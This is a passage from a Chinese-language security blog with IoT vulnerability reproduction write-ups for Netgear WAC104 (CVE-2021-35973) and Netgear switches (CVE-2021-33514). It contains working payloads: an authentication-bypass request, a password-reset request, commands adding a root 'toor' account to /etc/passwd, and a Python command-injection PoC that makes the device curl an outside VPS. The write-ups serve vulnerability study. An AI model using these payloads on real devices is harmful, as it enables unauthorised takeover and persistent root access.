<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">install_element (<span class="keyword">enum</span> node_type ntype, <span class="keyword">struct</span> cmd_element *cmd)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cmd_node</span> *<span class="title">cnode</span>;</span></span><br><span class="line"></span><br><span class="line">  cnode = vector_slot (cmdvec, ntype);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cnode == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Command node %d doesn&#x27;t exist, please check it\n&quot;</span>,</span><br><span class="line">	       ntype);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  vector_set (cnode-&gt;cmd_vector, cmd);</span><br><span class="line"></span><br><span class="line">  cmd-&gt;strvec = cmd_make_descvec (cmd-&gt;<span class="built_in">string</span>, cmd-&gt;doc);</span><br><span class="line">  cmd-&gt;cmdsize = cmd_cmdsize (cmd-&gt;strvec);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmd_element</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *<span class="built_in">string</span>;			<span class="comment">/* Command specification by string. */</span></span><br><span class="line">  <span class="type">int</span> (*func) (<span class="keyword">struct</span> cmd_element *, <span class="keyword">struct</span> vty *, <span class="type">int</span>, <span class="type">char</span> **);</span><br><span class="line">  <span class="type">char</span> *doc;			<span class="comment">/* Documentation of this command. */</span></span><br><span class="line">  <span class="type">int</span> daemon;                   <span class="comment">/* Daemon to which this command belong. */</span></span><br><span class="line">  <span class="built_in">vector</span> strvec;		<span class="comment">/* Pointing out each description vector. */</span></span><br><span class="line">  <span class="type">int</span> cmdsize;			<span class="comment">/* Command index count. */</span></span><br><span class="line">  <span class="type">char</span> *config;			<span class="comment">/* Configuration string */</span></span><br><span class="line">  <span class="built_in">vector</span> subconfig;		<span class="comment">/* Sub configuration string */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>通过对应IDA和zebra源码中的结构体，可以猜测出来，回调函数是注册在sub_1509c这个函数，大概传入的参数就是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_1509c</span><span class="params">(<span class="keyword">struct</span> cmd_element *, <span class="keyword">struct</span> vty *, <span class="type">int</span>, <span class="type">char</span> **)</span>;</span><br></pre></td></tr></table></figure>

<p>其中和文件描述符相关的是结构体vty，具体就不展开了，师傅们分析可以到zebra源码中去查看结构体vty的定义，这个结构体中是具体的一个zebra会话状态的相关描述，例如会话的权限、输入命令长度、命令缓冲区、历史命令等等。其实这个地方我分析得不是很明了，源码的执行逻辑还是有点绕，猜测安全研究人员应该是根据命令的提示，发现可以通过文件设置banner，然后尝试读取文件，或者研究人员有过类似的开发研究经历。</p>
<h3 id="CVE-2021-12819：测试环境CLI命令执行"><a href="#CVE-2021-12819：测试环境CLI命令执行" class="headerlink" title="CVE-2021-12819：测试环境CLI命令执行"></a>CVE-2021-12819：测试环境CLI命令执行</h3><p>首先分析是如何开启telnet的，通过访问https:&#x2F;&#x2F;<router_ip>&#x2F;start_telnet即可，似乎不涉及到使用了某个CGI，那么直接在后端服务器lighttpd中去搜寻关键字telnet，查看字符串的交叉引用，然后看看执行逻辑。使用IDA可以看到，在函数<code>http_request_parse</code>中，有一段代码逻辑是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(v13, <span class="string">&quot;/start_telnet&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  log_error_write(a1, <span class="string">&quot;request.c&quot;</span>, <span class="number">460</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;start telnet&quot;</span>, v190, v191, v211, v231, v251);</span><br><span class="line">  system(<span class="string">&quot;telnetd -b 0.0.0.0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来是分析，命令执行是如何发生的。命令执行漏洞是发生在cli中，那么可以先定位到cli和cli使用的so文件。使用find可以找到两个可疑的两个目标，&#x2F;lib&#x2F;libcli.so和&#x2F;usr&#x2F;bin&#x2F;cli。先看可执行文件cli，通过搜索ping关键字可以直接定位到关键代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cli_register_command(cli_session, <span class="number">0</span>, <span class="string">&quot;protest&quot;</span>, cmd_protest, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;protest cmd&quot;</span>);</span><br><span class="line">cli_register_command(cli_session, <span class="number">0</span>, <span class="string">&quot;iwpriv&quot;</span>, cmd_iwpriv, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;iwpriv cmd&quot;</span>);</span><br><span class="line">cli_register_command(cli_session, <span class="number">0</span>, <span class="string">&quot;ifconfig&quot;</span>, cmd_ifconfig, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;ifconfig cmd&quot;</span>);</span><br><span class="line">cli_register_command(cli_session, <span class="number">0</span>, <span class="string">&quot;iwconfig&quot;</span>, cmd_iwconfig, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;iwconfig cmd&quot;</span>);</span><br><span class="line">cli_register_command(cli_session, <span class="number">0</span>, <span class="string">&quot;reboot&quot;</span>, cmd_reboot, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;reboot cmd&quot;</span>);</span><br><span class="line">cli_register_command(cli_session, <span class="number">0</span>, <span class="string">&quot;brctl&quot;</span>, cmd_brctl, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;brctl cmd&quot;</span>);</span><br><span class="line">cli_register_command(cli_session, <span class="number">0</span>, <span class="string">&quot;ated&quot;</span>, cmd_ated, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;ated cmd&quot;</span>);</span><br><span class="line">cli_register_command(cli_session, <span class="number">0</span>, <span class="string">&quot;ping&quot;</span>, cmd_ping, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;ping cmd&quot;</span>);</span><br><span class="line">cli_register_command(cli_session, <span class="number">0</span>, <span class="string">&quot;sh&quot;</span>, cmd_shell, <span class="number">15</span>, <span class="number">0</span>, <span class="string">&quot;sh cmd&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>好家伙，还没有去符号表，和前面复现中cli的显示基本一致了。一般这种实现都是注册了某个回调函数，例如cmd_ping，可以在IDA中进入查看。非常巧合的是，我去搜索了一下这个函数，发现是Github上的一个开源<a target="_blank" rel="noopener" href="https://github.com/dparrish/libcli/">libcli</a>项目的，这就极大降低了逆向的难度。平常在做研究的时候也可以通过去找设备开发的GPL协议，然后定位使用了什么开源项目，降低逆向难度。如下是开源的函数原型，可以看到cmd_ping函数就是注册的回调，是选择了命令后具体执行的函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cli_command *<span class="title function_">cli_register_command</span><span class="params">(<span class="keyword">struct</span> cli_def *cli, <span class="keyword">struct</span> cli_command *parent, <span class="type">const</span> <span class="type">char</span> *command,</span></span><br><span class="line"><span class="params">                                         <span class="type">int</span> (*callback)(<span class="keyword">struct</span> cli_def *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> **, <span class="type">int</span>), <span class="type">int</span> privilege,</span></span><br><span class="line"><span class="params">                                         <span class="type">int</span> mode, <span class="type">const</span> <span class="type">char</span> *help)</span></span><br></pre></td></tr></table></figure>

<p>进一步的关键函数调用链就是：cmd_ping -&gt; systemCmd -&gt; popen，感兴趣的师傅可以进入具体查看，也没有什么复杂的绕过，直接就是格式化字符串然后到popen执行。</p>
<p>猜测这一个CVE实际上是开发人员原本为了方便测试设置的，从开启telnet到使用测试CLI执行命令。CLI在登录的时候也有明确提示，属于测试CLI。然后在实际交付代码的时候却没有把相关代码去掉。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本篇文章首先对一连串的漏洞进行了复现，实现了从敏感信息泄露到远程RCE的过程。然后从逆向结合能够查找到的相关开源组件源码，对漏洞进行了分析。期间还是走了很多弯路，用了不短的时间去分析执行逻辑、回调函数之类的，最后深一步理解到了查找研究目标GPL相关开源组件代码，进一步降低逆向难度的重要性。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-2021-35973%20Netgear%20wac104%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="菜">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/12/CVE-2021-35973%20Netgear%20wac104%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">CVE-2021-35973 Netgear wac104 身份认证绕过</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-12 07:09:45 / Modified: 19:13:58" itemprop="dateCreated datePublished" datetime="2023-04-12T07:09:45+08:00">2023-04-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>最直观的方式，是先看POC，得到大概利用思路，再进行静态分析，然后拿真实设备调试（咸鱼）。</p>
<h3 id="http认证绕过"><a href="#http认证绕过" class="headerlink" title="http认证绕过"></a>http认证绕过</h3><p>使用的后端是mini_httpd，一个小型的嵌入式后端服务器，常见的还有lighthttpd、httpd等等，或者直接通过一些脚本例如lua来充当后端也是存在的。</p>
<p>通过在URL中附加<code>%00currentsetting.htm</code>来达到身份认证绕过，本来一开始以为是类似于之前的Netgear的一个身份认证绕过，通过<code>strstr()</code>此类函数直接判定URL中包含一些全局资源，然后无条件返回请求的资源，但是，并不是这样的，而是<code>currentsetting.htm</code>字段会触发一个判定标志，这个标志&#x3D;1会直接使判定通过。这个标志在http解析流程中一共有三个被赋值的地方，分别是：</p>
<ol>
<li>在从<code>00407A28</code>开始的函数，也就是http的处理流程，当header的解析时，当<code>SOAPAction</code>字段包含特定的字符串<code>urn:NETGEAR-ROUTER:service</code></li>
</ol>
<p><img src="/images/image-2023-0412-191051892.png" alt="undifined"> </p>
<ol start="2">
<li>在函数从<code>00407A28</code>地址开始，同样在http解析流程中，当请求URL中包含字符串<code>setupwizard.cgi</code></li>
</ol>
<p><img src="/images/image-2023-0412-191108173.png" alt="undifined"></p>
<ol start="3">
<li>还是在这个http处理的函数中</li>
</ol>
<p><img src="/images/image-2023-0412-191122920.png" alt="undifined"></p>
<p>但是前两个产生的标志位，出现在函数的比较靠前位置，都会导致程序的提前中止，就不能达到绕过的效果，第三个则相对靠后，不会退出。</p>
<p><img src="/images/image-2023-0412-191138896.png" alt="undifined"></p>
<p>因此可以通过构造如下的请求，对任意页面进行未授权访问：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /file-to-access%00currentsetting.htm HTTP/1.1</span><br></pre></td></tr></table></figure>

<h3 id="发生在setup-cgi中的sesstion-id认证绕过"><a href="#发生在setup-cgi中的sesstion-id认证绕过" class="headerlink" title="发生在setup.cgi中的sesstion id认证绕过"></a>发生在setup.cgi中的sesstion id认证绕过</h3><p>在main函数的代码开头，如果是POST方法，紧接下来就是对于<code>/tmp/SessionFile</code>文件的读取。先从POST请求中获取id字段的值，然后通过一个子函数<code>sub_403F04</code>从<code>/tmp/SessionFile</code>中读取存在系统中的id，二者进行比较。如果相同则通过了id的校验。验证逻辑关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">id_loc = <span class="built_in">strstr</span>(post_data, <span class="string">&quot;id=&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (id_loc) &#123;</span><br><span class="line">	id_from_post = strtol(id_loc + <span class="number">3</span>, &amp;v19, <span class="number">16</span>); 	<span class="comment">// 字符串转换成长整数, v19指向处理完id后的字符串</span></span><br><span class="line">    <span class="keyword">if</span>(v19 &amp;&amp; <span class="built_in">strstr</span>(v19, <span class="string">&quot;sp=&quot;</span>)) 					<span class="comment">// 根据id和sp字段寻找session_file</span></span><br><span class="line">        <span class="built_in">snprintf</span>(session_file, <span class="number">128</span>, <span class="string">&quot;%s%s&quot;</span>, session_file)</span><br><span class="line">	<span class="keyword">if</span> (id_from_post == sub_403F04(session_file))</span><br><span class="line">		<span class="keyword">goto</span> verify_success_label;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在子函数<code>sub_403F04</code>中存在逻辑上的问题，如果<code>session_file</code>不存在，<code>id_from_file</code>会直接返回0。那么，就可以通过构造<code>id=0&amp;sp=ABC</code>这种肯定找不到<code>session_file</code>的字段，从而达到<code>id_from_post == id_from_file == 0</code>验证通过。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_403F04</span><span class="params">(<span class="type">char</span>* session_file)</span> &#123;</span><br><span class="line">	id_from_file = <span class="number">0</span>;</span><br><span class="line">	File* f = fopen(session_file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (f) &#123;</span><br><span class="line">		fscan(f, <span class="string">&quot;%x&quot;</span>, &amp;id_from_file);</span><br><span class="line">		fclose(f);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> id_from_file;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="setup-cgi未检验密码修改"><a href="#setup-cgi未检验密码修改" class="headerlink" title="setup.cgi未检验密码修改"></a>setup.cgi未检验密码修改</h3><p>整个cgi的处理流程大概是，当用户通mini_httpd登录，mini_httpd会将请求方式和请求附加参数写入到环境变量中，cgi读取环境变量<code>REQUEST_METHOD</code>获取请求方式，例如GET或POST；读取<code>QUERY_STRING</code>获取请求参数；然后通过写入能唯一标识会话的一些参数到文件中，用于会话管理。最后就是具体的对用户发送的数据进行处理。这个流程可以在setup.cgi文件逆向的<code>main</code>函数中查看，还是比较清晰明了。</p>
<p>在CVE作者的分析文章里面，有提到是通过cgi的哪一个接口直接修改密码的，我也定位到了这个函数<code>sub_40808</code>。但是，这个函数在cgi中没有被调用过？那么作者是如何得到这个接口的呢，直接通过抓包么。先直接给出payload，通过构造如下的方式可以重新设置密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /setup.cgi?todo=con_save_passwd&amp;sysNewPasswd=ABC&amp;sysConfirmPasswd=ABC%00currentsetting.htm HTTP/1.1</span><br><span class="line">Host: aplogin</span><br></pre></td></tr></table></figure>

<p>对于<code>sub_40808</code>的逆向，流程也很简单，检查两次输入的新密码是否相同，如果相同，就写入到NVRAM中的http_password中。但是如果要永久更改admin账号的密码到&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;htpasswd中，可以通过如下两种方式之一：</p>
<ol>
<li>重启设备，可以通过调用接口<code>/setup.cgi?todo=reboot</code>，将密码写入到&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;htpasswd中</li>
<li>调用接口<code>/setup.cgi?todo=save_passwd</code>将密码写入到文件中</li>
</ol>
<p>猜测这两个接口，是因为有路由器真实设备，在初始化的时候，第一次设置密码，通过分析交互http数据包得到的。</p>
<h3 id="x2F-tmp-x2F-etc目录权限管理"><a href="#x2F-tmp-x2F-etc目录权限管理" class="headerlink" title="&#x2F;tmp&#x2F;etc目录权限管理"></a>&#x2F;tmp&#x2F;etc目录权限管理</h3><p>可以通过setup.cgi开启路由器的telnet，结合之前的mini_httpd和setup.cgi的认证绕过，请求<code>/setup.cgi?todo=debug</code>。此时通过telnet登录得到的权限是admin权限，而不是root权限。但是因为&#x2F;tmp&#x2F;etc目录权限管理的问题，可以在&#x2F;tmp&#x2F;etc&#x2F;passwd中添加一个root权限的账号。操作如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/etc</span><br><span class="line">cp passwd passwdx</span><br><span class="line">echo toor:scEOyDvMLIlp6:0:0::scRY.aIzztZFk:/sbin/sh &gt;&gt; passwdx</span><br><span class="line">mv passwd old_passwd</span><br><span class="line">mv passwdx passwd</span><br></pre></td></tr></table></figure>

<p>出现问题的原因是分析如下，&#x2F;etc&#x2F;目录通过软链接到了&#x2F;tmp&#x2F;etc&#x2F;目录，而&#x2F;tmp&#x2F;etc&#x2F;目录的权限是777。</p>
<p><img src="/images/image-2023-0412-191157963.png" alt="undifined"></p>
<p><img src="/images/image-2023-0412-191216580.png" alt="undifined"></p>
<p>那么admin权限的用户不能更改&#x2F;etc&#x2F;passwd文件，因为这是被root拥有的且权限为644（rw-r–r–)。但是admin权限的用户可以创建一个新的passwd文件，然后通过如上的方式，添加root权限账号。</p>
<p>这是执行了添加root权限操作后的文件属性。</p>
<p><img src="/images/image-2023-0412-191231156.png" alt="undifined"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过如上一系列的攻击链，先通过http的认证绕过，可以访问到setup.cgi；但是setup.cgi的操作也是存在sessionID认证，于是再次进行认证绕过；而且通过分析setup.cgi提供的接口，发现可以任意修改admin权限的登录密码，还可以开启调试模式的telnet；虽然这个时候通过telnet登录上去的是一个admin权限（非root），但是恰好由于&#x2F;etc&#x2F;里面的文件权限管理的问题，可以添加root权限的账号和密码。</p>
<p>那么这一系列的操作下来，就达到了一个未授权RCE漏洞。太强了太强了。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-99295">https://www.seebug.org/vuldb/ssvid-99295</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-2021-33514%20Netgear%E5%A4%9A%E6%AC%BE%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="菜">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/12/CVE-2021-33514%20Netgear%E5%A4%9A%E6%AC%BE%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">CVE-2021-33514 Netgear多款交换机命令注入漏洞分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-12 07:03:09 / Modified: 19:08:41" itemprop="dateCreated datePublished" datetime="2023-04-12T07:03:09+08:00">2023-04-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>CVE-2021-33514是发生在Netgear多款交换机上的命令注入漏洞，可以未认证远程代码执行，CVSS3：9.8（高危）。</p>
<p>漏洞产生的根本原因是libsal.so.0.0中的函数<code>sal_sys_ssoReturnToken_chk</code>存在命令注入，这个函数用于处理url中的<code>tocken</code>字段，直接将<code>tocken</code>传递到格式化字符串中，然后调用<code>popen</code>执行。后端处理setup.cgi加载了该so文件，并且在处理url的时候调用了该存在漏洞的函数。漏洞利用起来也非常简单，直接给cgi发送构造了命令的请求就可以。</p>
<p>Netgear官方给出的受漏洞影响设备和固件版本如下表：</p>
<table>
<thead>
<tr>
<th>影响设备</th>
<th>固件版本</th>
</tr>
</thead>
<tbody><tr>
<td>GC108P</td>
<td>&lt;&#x3D;1.0.7.3</td>
</tr>
<tr>
<td>GC108PP</td>
<td>&lt;&#x3D;1.0.7.3</td>
</tr>
<tr>
<td>GS108Tv3</td>
<td>&lt;&#x3D;7.0.6.3</td>
</tr>
<tr>
<td>GS110TPP</td>
<td>&lt;&#x3D;7.0.6.3</td>
</tr>
<tr>
<td>GS110TPv3</td>
<td>&lt;&#x3D;7.0.6.3</td>
</tr>
<tr>
<td>GS110TUP</td>
<td>&lt;&#x3D;1.0.4.3</td>
</tr>
<tr>
<td>GS710TUP</td>
<td>&lt;&#x3D;1.0.4.3</td>
</tr>
<tr>
<td>GS716TP</td>
<td>&lt;&#x3D;1.0.2.3</td>
</tr>
<tr>
<td>GS716TPP</td>
<td>&lt;&#x3D;1.0.2.3</td>
</tr>
<tr>
<td>GS724TPP</td>
<td>&lt;&#x3D;2.0.4.3</td>
</tr>
<tr>
<td>GS724TPv2</td>
<td>&lt;&#x3D;2.0.4.3</td>
</tr>
<tr>
<td>GS728TPPv2</td>
<td>&lt;&#x3D;6.0.6.3</td>
</tr>
<tr>
<td>GS728TPv2</td>
<td>&lt;&#x3D;6.0.6.3</td>
</tr>
<tr>
<td>GS752TPPv1</td>
<td>&lt;&#x3D;6.0.6.3</td>
</tr>
<tr>
<td>GS752TPv2</td>
<td>&lt;&#x3D;6.0.6.3</td>
</tr>
<tr>
<td>MS510TXM</td>
<td>&lt;&#x3D;1.0.2.3</td>
</tr>
<tr>
<td>MS510TXUP</td>
<td>&lt;&#x3D;1.0.2.3</td>
</tr>
</tbody></table>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>复现过程仅仅使用了python的requests模块，设备使用的是放置在公网的GS110TPP，固件版本V7.0.1.16，使用的so和cgi程序关键代码差别不大，具有代表性。通过分析交换机固件发现里面常见的可以反弹shell的程序都木有，那验证命令执行就使用了curl，用它去访问我的公网VPS，如果nc检测到访问，说明发生了命令注入。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">vul_url = <span class="string">&#x27;https://X.X.X.X/cgi/setup.cgi?token=\&#x27;;$(cat);\&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;curl X.X.X.X.X:8080&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	res = requests.post(url=vul_url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;[!] should not return any thing&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;[+] success!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0412-190351813.png" alt="undifined"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h3><p>首先在Netgear官网上可以下载到存在漏洞的固件，必须赞扬一下Netgear，基本上以往的固件都可以下载到，而且几乎都是没有加密的，这对漏洞分析来说大大的好。下载到固件了按照流程<code>binwalk -Me</code>一把梭，然后使用find就会发现，找不到存在漏洞的so文件也找不到存在调用so的cgi程序。仔细看解压出来可能的文件系统文件夹里面，其实还有modsqfs.img和sqfs.img两个文件，这还得binwalk继续梭了这两个文件，才能有得到存在漏洞的so和cgi。</p>
<p><img src="/images/image-2023-0412-190409220.png" alt="undifined"></p>
<p><img src="/images/image-2023-0412-190425304.png" alt="undifined"></p>
<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>流程上还是比较简单的。首先看一下<code>libsal.so</code>里面存在漏洞的函数<code>sal_sys_ssoReturnToken_chk</code>，下面是直接贴出来IDA反编译结果，可以看到直接将函数输入<code>a1</code>，格式化字符串到<code>v25</code>中，然后调用<code>popen</code>执行了<code>v25</code>。</p>
<p><img src="/images/image-2023-0412-190441040.png" alt="undifined"></p>
<p>再看看<code>setup.cgi</code>中是如何调用这个函数的，这个地方注意，C语言的或逻辑是，如果前面的判定通过了，后续就不进行判定。第一个判定是检查<code>query_string</code>中是否含有<code>tocken</code>字符串，当我们构造了payload那么判定会失败，则继续执行后面使用逗号连接的C语句，调用漏洞函数。<code>strtok</code>函数用于使用特定字符分割字符串，详情使用可以参考函数说明，最终就把<code>tocken</code>字段的值赋值给<code>v9</code>。</p>
<p><img src="/images/image-2023-0412-190455585.png" alt="undifined"></p>
<h3 id="关于CGI以及此处payload的写法"><a href="#关于CGI以及此处payload的写法" class="headerlink" title="关于CGI以及此处payload的写法"></a>关于CGI以及此处payload的写法</h3><p><strong>CGI如何处理用户请求</strong></p>
<p>之前分析的路由器后端的程序，大多是某某httpd+cgi的做法，当时对于cgi程序如何获取到url传递的参数就仅仅有一个感性的认识：通过环境变量来进行传参，如果是GET请求，那么看环境变量<code>QUERY_STRING</code>，如果是POST请求，可能先从<code>CONTENT_LENGTH</code>获取数据长度，然后从<code>STDIN</code>中读取指定长度的数据。但对于cgi程序是如何执行的，与httpd之间的关系是什么，还是有点迷糊。于是找了一些文章大概看了下。</p>
